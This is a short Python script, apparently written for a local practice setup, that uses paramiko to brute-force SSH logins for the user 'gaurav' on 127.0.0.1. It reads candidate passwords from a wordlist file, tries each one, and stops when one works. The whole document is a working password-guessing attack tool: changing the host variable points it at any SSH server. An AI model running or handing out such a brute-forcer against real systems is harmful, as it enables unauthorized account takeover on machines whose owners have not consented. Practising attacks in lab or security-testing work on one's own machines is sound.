from pwn import *
import paramiko

host = "127.0.0.1"
username = "gaurav"
attempts = 0

def ssh(host, user, password=None, timeout=10):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        if password:
            client.connect(host, username=user, password=password, timeout=timeout)
        else:
            private_key_path = '/path/to/new/private_key_no_passphrase.pem'
            private_key = paramiko.RSAKey(filename=private_key_path)
            client.connect(host, username=user, pkey=private_key, timeout=timeout)

        print("[+] Authentication succeeded")
        client.close()
        return True
    except paramiko.AuthenticationException:
        print("[x] Authentication failed")
        return False
    except paramiko.SSHException as e:
        print(f"[-] SSH error: {e}")
        return False

# Modify the path to your new private key without a passphrase
private_key_path = '/path/to/new/private_key_no_passphrase.pem'

with open("/home/gaurav/Downloads/ssh_passwd.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=10)
            if response:
                print("[>] Valid password found: '{}'!".format(password))
                break
        except Exception as e:
            print(f"[-] An error occurred: {e}")

        attempts += 1
